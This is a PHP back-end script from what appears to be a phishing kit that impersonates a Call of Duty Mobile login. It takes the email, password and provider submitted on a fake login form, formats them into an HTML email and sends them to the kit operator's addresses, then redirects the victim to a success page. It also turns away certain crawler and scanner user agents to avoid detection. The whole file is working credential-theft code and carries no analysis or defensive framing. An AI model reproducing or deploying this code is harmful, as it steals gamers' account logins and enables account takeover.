<?php 
$ua = $_SERVER['HTTP_USER_AGENT'];include"../.mobilelegends.php";if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) { header('https://web.facebook.com/MhmdDhanzGans'); die(); }
if(isset($_POST['masuk'])) {
    $email = $_POST['email'];
    $pass  = $_POST['password'];
    $prov  = $_POST['provider'];

    if(empty($email) || empty($pass) || empty($prov)) {
        header('location: ../../');
        exit();
    } else {
        include '../../email.php'; 
        $punya = strtoupper($email);
        $subject = "AKUN CODM LOG $prov | PUNYA $punya";
        $body = <<<EOD
            <pre style='font-size: 1.1em;'>
            <table>
            <tr>
                <th colspan="3" align="left">AKUN CODM LOGIN $prov</th>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
            <tr>
                <th colspan="3" align="left">Data Akun</th>
            </tr>
            <tr>
                <td>Email</td>
                <td>:</td>
                <td>$email</td>
            </tr>
            <tr>
                <td>Password</td>
                <td>:</td>
                <td>$pass</td>
            </tr>
            <tr>
                <td>&nbsp;</td>
            </tr>
            <tr>
                <th colspan="3" align="left">subscribe yt Irzan NF</th>
            </tr>
            </table>
            </pre>
EOD;
        $headersx = 'MIME-Version: 1.0' . "\r\n"; 
        $headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n"; 
        $headersx .= 'From: Irzan NF <irzan@nf.com>' . "\r\n"; 
        $datamail = mail($emailku, $subject, $body, $headersx); 
        $datamail = mail($mailto, $subject, $body, $headersx); 
        if($datamail) {
            session_start();
            $_SESSION['login'] = "Login";
            header('location: berhasil.php');
            exit();
        }
    }
} else {
    echo '<script type="text/javascript">alert("Login Required!"); document.location="../../";</script>';
    exit();
}
?>